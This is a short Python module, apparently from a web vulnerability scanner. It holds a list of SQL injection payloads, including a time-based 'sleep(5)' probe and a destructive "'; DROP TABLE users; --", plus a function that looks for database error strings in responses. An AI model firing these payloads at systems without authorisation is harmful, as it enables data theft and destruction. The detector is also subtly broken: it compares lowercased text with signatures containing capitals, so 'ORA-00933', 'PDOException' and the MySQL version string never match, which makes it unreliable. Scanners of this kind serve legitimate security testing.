# modules/sql_injection.py

from typing import List

def get_sqli_payloads() -> List[str]:
    return [
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR '1'='1' --",
        "\" OR \"1\"=\"1",
        "'; DROP TABLE users; --",
        "' OR sleep(5)--",
        "admin' --",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR 'x'='x",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "' OR EXISTS(SELECT * FROM users)--"
    ]

def is_sqli_response(response_text: str) -> bool:
    error_signatures = [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unclosed quotation mark after the character string",
        "quoted string not properly terminated",
        "sqlstate",
        "syntax error",
        "near '",
        "unknown column",
        "ORA-00933",
        "PDOException",
        "MySQL server version for the right syntax",
        "unterminated string constant",
        "invalid query",
        "fatal error",
    ]
    lowered = response_text.lower()
    return any(signature in lowered for signature in error_signatures)
#